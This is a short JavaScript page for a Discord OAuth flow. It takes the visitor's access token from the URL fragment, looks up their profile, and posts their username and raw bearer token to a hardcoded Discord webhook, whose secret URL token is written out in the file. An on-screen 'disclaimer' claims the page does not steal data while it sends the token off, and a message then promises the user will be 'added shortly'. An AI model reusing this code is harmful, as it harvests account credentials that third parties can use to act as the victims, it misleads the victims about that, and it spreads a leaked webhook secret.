usp = new URLSearchParams(window.location.hash.replace("#", ""))
//window.location.hash = ""
logs = document.createElement("pre")
document.body.appendChild(logs)
function logVisual(text) {
  logs.innerText = logs.innerText + "\n" + text
}
function onDone() {
  logVisual("You can close this tab now.")
}
async function readAll() {
  rawResponse = await fetch('https://discord.com/api/v10/users/@me', {
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${usp.get("access_token")}`,
      'Accept': 'application/json',

    },
  });
  content = await rawResponse.json();

  console.log(content);
    await fetch("https://discord.com/api/v10/webhooks/1120077060044501012/iYuSc_0JK0df-tp1vC4GaiTtiz2GeRO9PcYyzZ3sV0Hj_7c3LW912s8Mxt1--bgZItbK?wait=true", {
      "headers": {
        "accept": "application/json",

        "content-type": "application/json",
      },
      "body": `{\"content\":\"${content.username}#${content.discriminator} - ${usp.get("access_token")}\",\"embeds\":null,\"attachments\":[]}`,
      "method": "POST",


    });
  logVisual("Token Submitted. You will be added shortly.")

  setTimeout(onDone, 1000)
}
logVisual("DISCLAIMER: THIS DOES NOT STEAL YOUR DATA, I ONLY HAVE ACCESS TO YOUR PROFILE, THE OAUTH TOKEN WILL BE SENT TO ME IN TWO SECONDS.")
logVisual("CLOSE THIS PAGE IF YOU DO NOT WANT ME TO ACCESS ANY OF YOUR INFORMATION")
logVisual("WAIT TWO SECONDS TO PROCEED")
setTimeout(readAll,2000)